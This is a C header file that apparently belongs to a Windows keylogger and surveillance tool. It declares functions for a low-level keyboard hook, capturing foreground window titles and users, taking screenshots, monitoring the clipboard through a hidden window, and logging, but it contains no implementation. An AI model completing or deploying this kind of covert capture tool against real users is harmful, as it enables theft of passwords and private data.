#pragma once
#pragma warning(disable: 4820)
#pragma warning(disable: 5045)
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <bcrypt.h>
#include <winternl.h>
#include <wtsapi32.h>
#include "consts.h"

#define REEF(x){ if (x){ free(x); x = NULL;}}

//keylogger
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
VOID CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime);
VOID LogvKey(INT vKey, INT MODE);
VOID GetUsernameOfForegroundWindow(LPSTR username, DWORD foregroundWindowPID);
VOID GetWindowTitle(HWND hwnd);

//Screenshot
VOID TakeScreenshot(void);

//Clipboard
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
WNDCLASSEXA CreateEmptyClassWindow(void);
HWND CreateEmptyWindow(void);

//log
VOID log(void *toLog, int MODE, BOOL putDate);

//error handling
INT PrintError(void);